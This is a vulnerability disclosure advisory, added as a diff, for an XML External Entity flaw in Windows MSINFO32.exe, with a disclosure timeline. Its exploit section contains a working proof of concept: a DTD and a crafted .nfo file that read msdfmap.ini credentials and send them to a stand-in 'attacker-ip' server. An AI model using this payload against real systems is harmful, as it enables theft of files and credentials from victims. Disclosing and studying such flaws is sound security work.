@@ -1,0 +1,132 @@
+[+] Credits: John Page aka hyp3rlinx
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source: http://hyp3rlinx.altervista.org/advisories/MICROSOFT-MSINFO32-XXE-FILE-EXFILTRATION.txt
+
+[+] ISR: ApparitionSec
+
+
+
+Vendor:
+=================
+www.microsoft.com
+
+
+
+Product:
+==========================
+Windows System Information
+MSINFO32.exe v6.1.7601
+
+
+Windows MSINFO32.EXE Displays a comprehensive view of your hardware, system
+components, and software environment.
+
+Parameters
+FileName   : Specifies the file to be opened. This can be an .nfo, .xml, .txt, or .cab file.
+
+
+
+Vulnerability Type:
+===================
+XML External Entity
+
+
+
+CVE Reference:
+==============
+N/A
+
+
+
+Vulnerability Details:
+=====================
+
+Microsoft Windows MSINFO32.exe is vulnerable to XML External Entity attack
+which can potentially allow remote attackers to
+gain access to and exfiltrate files from the victims computer if they open
+a malicious ".nfo" file via remote share / USB etc.
+
+Upon open the file user will see error message like "System Information is
+unable to open this .nfo file. The file might
+be corrupt etc..
+
+
+Tested Windows 7 SP1
+
+
+Exploit code(s):
+===============
+
+Access and exfiltrate Windows "msdfmap.ini" file as trivial POC.
+This file contains credentials for MS ADO Remote Data Services.
+
+
+1) python -m SimpleHTTPServer 8080 (runs on attacker-ip / hosts payload.dtd)
+
+
+
+2) "payload.dtd"
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker-ip:8080?%file;'>">
+%all;
+
+
+
+3) "FindMeThatBiatch.nfo" (corrupt .NFO file)
+
+<?xml version="1.0"?>
+<!DOCTYPE HYP3RLINX [
+<!ENTITY % file SYSTEM "C:\Windows\msdfmap.ini">
+<!ENTITY % dtd SYSTEM "http://attacker-ip:8080/payload.dtd">
+%dtd;]>
+<pwn>&send;</pwn>
+
+
+
+Double click to open FindMeThatBiatch.nfo, user gets error MSINFO32
+opens... attacker gets files.
+
+OR open via Windows CL:
+c:\>msinfo32  \\REMOTE-SHARE\FindMeThatBiatch.nfo
+
+
+
+Disclosure Timeline:
+======================================
+Vendor Notification: September 4, 2016
+Vendor Reply "not meet the bar for security servicing": September 7, 2016
+December 4, 2016  : Public Disclosure
+
+
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+
+Severity Level:
+================
+High
+
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no
+warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the
+information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author
+prohibits any malicious use of security related information
+or exploits by the author or elsewhere.
+
+hyp3rlinx
